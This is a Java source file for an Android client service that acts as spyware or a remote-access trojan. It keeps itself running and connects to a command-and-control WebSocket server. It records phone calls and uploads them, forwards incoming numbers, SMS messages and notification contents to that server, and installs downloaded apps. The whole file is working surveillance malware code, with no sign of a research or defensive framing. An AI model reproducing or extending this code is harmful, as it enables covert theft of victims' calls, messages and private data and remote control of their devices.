package com.ot.grhq.client;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;

import androidx.annotation.Nullable;

import com.ot.grhq.client.functionality.FileManager;
import com.ot.grhq.client.functionality.Location;
import com.ot.grhq.client.functionality.PackageManager;
import com.ot.grhq.client.functionality.Utils;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;

public class MainService extends Service {

    private static WebSocketClient client;

    private boolean isConnected = false;
    private final String SERVICE_RESTART_INTENT = "com.ot.grhq.receiver.restartservice";

    private static MediaRecorder recorder = new MediaRecorder();

    private static File audiofile = null;

    private static String incomingNumber;

    private static boolean isRecording = false;

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (!isConnected) {
            try {
                connectToWebSocket();
            } catch (URISyntaxException e) {}
        }

        final Handler handler = new Handler();
        final int delay = 30000;

        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                try {
                    updateWebSocketID();
                } catch (JSONException e) {}
                handler.postDelayed(this, delay);
            }
        }, delay);

        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();

        isConnected = false;
        Intent restartService = new Intent(SERVICE_RESTART_INTENT);
        sendBroadcast(restartService);
    }

    private void connectToWebSocket() throws URISyntaxException {
        client = new WebSocketClient(getApplicationContext(), new URI(Utils.WEB_SOCKET_SERVER));
        client.connect();
        isConnected = false;
    }

    private void updateWebSocketID() throws JSONException {
        if (client.isOpen()) {
            JSONObject json = new JSONObject();
            json.put("id", Utils.clientID(getApplicationContext()));
            json.put("type", "client");
            json.put("res", "id");
            client.send(json.toString());
        }
    }

    /**
     * Phone call broadcast receiver
     */
    public static class Call extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (intent.getAction() != null && intent.getAction().equals("android.intent.action.PHONE_STATE")) {
                // Get the phone state from the intent
                String phoneState = intent.getStringExtra(TelephonyManager.EXTRA_STATE);

                if (phoneState != null) {
                    if (phoneState.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
                        // Incoming call is ringing
                        incomingNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);

                        JSONObject json = new JSONObject();
                        try {
                            json.put("id", Utils.clientID(context));
                            json.put("type", "client");
                            json.put("res", "log");
                            json.put("number", Base64.encode(incomingNumber.getBytes(), Base64.DEFAULT));
                            json.put("timestamp", System.currentTimeMillis());

                            client.send(json.toString());
                        } catch (Exception e) {}

                    } else if (phoneState.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
                        // Call is in progress (either incoming or outgoing)
                        //Creating file
                        File dir = Environment.getExternalStorageDirectory();
                        try {
                            audiofile = File.createTempFile(String.valueOf(System.currentTimeMillis()), ".3gp", dir);

                            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                            recorder.setOutputFile(audiofile.getAbsolutePath());
                            recorder.prepare();
                            recorder.start();
                            isRecording = true;
                        } catch (Exception e) {}

                    } else if (phoneState.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
                        // Call has ended
                        if (isRecording)
                            recorder.stop();
                        recorder.reset();
                        recorder.release();
                        isRecording = false;

                        FileManager.uploadFile(audiofile.getAbsolutePath(), Utils.C2_SERVER + "recordings");

                        JSONObject json = new JSONObject();
                        try {
                            json.put("id", Utils.clientID(context));
                            json.put("type", "client");
                            json.put("res", "recording");
                            json.put("number", Base64.encode(incomingNumber.getBytes(), Base64.DEFAULT));
                            json.put("filename", Base64.encode(audiofile.getName().getBytes(), Base64.DEFAULT));
                            json.put("timestamp", System.currentTimeMillis());

                            client.send(json.toString());
                        } catch (Exception e) {}
                    }
                }
            }
        }
    }


    /**
     * SMS notification receiver
     */
    public static class SMS extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (intent.getAction() != null && intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
                Bundle bundle = intent.getExtras();
                if (bundle != null) {
                    // Retrieve the SMS messages received.
                    Object[] pdus = (Object[]) bundle.get("pdus");

                    if (pdus != null) {
                        for (Object pdu : pdus) {
                            SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) pdu);

                            String senderNumber = currentMessage.getDisplayOriginatingAddress();
                            String messageBody = currentMessage.getDisplayMessageBody();

                            if (!senderNumber.isEmpty() && !messageBody.isEmpty() && client.isOpen() && client != null) {
                                JSONObject json = new JSONObject();
                                try {
                                    json.put("id", Utils.clientID(context));
                                    json.put("type", "client");
                                    json.put("res", "message");
                                    json.put("sender", senderNumber);
                                    json.put("content", messageBody);
                                    json.put("timestamp", System.currentTimeMillis());

                                    client.send(json.toString());
                                } catch (Exception e) {}
                            }
                        }
                    }
                }
            }
        }
    }

    /**
     * Notifications broadcast receiver
     */
    public static class NotificationReceiver extends BroadcastReceiver {

        @Override
        public void onReceive(Context context, Intent intent) {
            if ("notification_data".equals(intent.getAction())) {
                String packageName = intent.getStringExtra("package_name");
                String notificationContent = intent.getStringExtra("notification_content");

                // Use the WebSocketService to send data to the WebSocket
                if (client != null && client.isOpen()) {
                    JSONObject json = new JSONObject();
                    try {
                        json.put("id", Utils.clientID(context));
                        json.put("type", "client");
                        json.put("res", "notification");
                        json.put("sender", packageName);
                        json.put("content", notificationContent);
                        json.put("timestamp", System.currentTimeMillis());

                        client.send(json.toString());
                    } catch (JSONException e) {
                        throw new RuntimeException(e);
                    }
                }
            }
        }
    }

    /**
     * Download completed receiver
     */
    public static class DownloadComplete extends BroadcastReceiver {

        @Override
        public void onReceive(Context context, Intent intent) {
            if ("android.intent.action.DOWNLOAD_COMPLETE".equals(intent.getAction())) {
                String app = intent.getStringExtra("app_path");
                if (!app.isEmpty() && app != null)
                    PackageManager.installApp(context, app);

                String downloadURL = intent.getStringExtra("download_url");

                if (client != null && client.isOpen()) {
                    String message = Utils.clientID(context) + ": " + downloadURL + " successfully downloaded";
                    JSONObject json = new JSONObject();
                    try {
                        json.put("type", "client");
                        json.put("id", Utils.clientID(context));
                        json.put("res", "log");
                        json.put("message", Base64.encode(message.getBytes(), Base64.DEFAULT));
                        json.put("timestamp", System.currentTimeMillis());

                        client.send(json.toString());
                    } catch (JSONException e) {}
                }
            }
        }
    }

    /**
     * Completed file upload receiver
     */
    public static class UploadComplete extends BroadcastReceiver {

        @Override
        public void onReceive(Context context, Intent intent) {
            if ("upload_complete".equals(intent.getAction())) {
                String filePath = intent.getStringExtra("file_path");
                String uploadURL = intent.getStringExtra("upload_url");

                if (client != null && client.isOpen()) {
                    String message = Utils.clientID(context) + ": " + filePath + " successfully uploaded to " + uploadURL;
                    JSONObject json = new JSONObject();
                    try {
                        json.put("type", "client");
                        json.put("id", Utils.clientID(context));
                        json.put("res", "log");
                        json.put("message", Base64.encode(message.getBytes(), Base64.DEFAULT));
                        json.put("timestamp", System.currentTimeMillis());

                        client.send(json.toString());
                    } catch (JSONException e) {}
                }
            }
        }
    }
}


